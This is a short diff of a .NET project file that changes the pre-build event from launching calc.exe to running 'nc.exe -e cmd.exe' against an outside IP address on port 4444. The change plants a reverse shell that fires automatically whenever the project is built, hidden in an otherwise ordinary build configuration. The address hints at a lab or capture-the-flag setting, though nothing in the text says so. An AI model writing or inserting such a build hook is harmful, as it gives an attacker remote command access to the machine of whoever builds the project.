@@ -5,7 +5,7 @@
     <TargetFramework>net6.0</TargetFramework>
     <ImplicitUsings>enable</ImplicitUsings>
     <Nullable>enable</Nullable>
-    <PreBuildEvent>calc.exe</PreBuildEvent>
+    <PreBuildEvent>nc.exe -e cmd.exe 10.10.14.147 4444</PreBuildEvent>
   </PropertyGroup>
 
 </Project>
